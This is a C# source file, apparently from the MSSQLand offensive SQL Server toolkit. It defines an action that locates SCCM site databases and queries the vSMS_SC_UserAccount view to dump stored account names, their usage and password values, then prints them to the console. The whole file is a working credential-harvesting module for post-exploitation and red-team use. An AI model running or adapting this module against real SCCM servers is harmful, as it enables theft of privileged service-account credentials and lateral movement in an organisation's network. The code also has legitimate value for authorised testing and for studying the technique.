using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;

namespace MSSQLand.Actions.SCCM
{
    internal class SccmPasswords : BaseAction
    {
        public override void ValidateArguments(string[] args)
        {
            // No arguments required
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested("Enumerating SCCM stored credentials");

            SccmService sccmService = new(databaseContext.QueryService, databaseContext.Server);

            string[] requiredTables = { "vSMS_SC_UserAccount" };
            var databases = sccmService.GetValidatedSccmDatabases(requiredTables, 1);

            if (databases.Count == 0)
            {
                Logger.Warning("No SCCM databases found");
                return null;
            }

            foreach (string db in databases)
            {
                string siteCode = SccmService.GetSiteCode(db);

                Logger.NewLine();
                Logger.Info($"SCCM database: {db} (Site Code: {siteCode})");

                string query = $@"
SELECT
    UserName,
    Usage,
    Password
FROM [{db}].dbo.vSMS_SC_UserAccount
ORDER BY UserName;
";

                DataTable result = databaseContext.QueryService.ExecuteTable(query);

                if (result.Rows.Count == 0)
                {
                    Logger.Warning("No stored credentials found");
                    continue;
                }

                Logger.Success($"Found {result.Rows.Count} stored credential(s)");
                Console.WriteLine(OutputFormatter.ConvertDataTable(result));
            }

            Logger.Success("Credential enumeration completed");
            return null;
        }
    }
}
